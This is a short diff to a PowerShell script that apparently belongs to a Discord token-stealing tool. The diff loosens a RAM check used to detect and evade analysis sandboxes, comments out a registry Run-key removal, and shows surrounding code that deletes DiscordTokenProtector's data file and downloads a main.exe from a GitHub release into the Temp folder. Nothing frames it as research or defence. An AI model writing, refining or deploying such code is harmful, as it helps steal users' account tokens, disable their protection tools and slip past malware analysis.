@@ -101,7 +101,7 @@ function Search-Username ($usernames) {
 
 function ram_check {
     $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { [Math]::Round(($_.Sum / 1GB), 2) }
-    if ($ram -lt 6) {
+    if ($ram -lt 4) {
         make_error_page "RAM CHECK FAILED"
         Start-Sleep -s 3
         exit
@@ -816,10 +816,10 @@ function Backup-Data {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
 
-    try {
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-    }
-    catch {}
+    #try {
+    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
+    #}
+    #catch {}
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
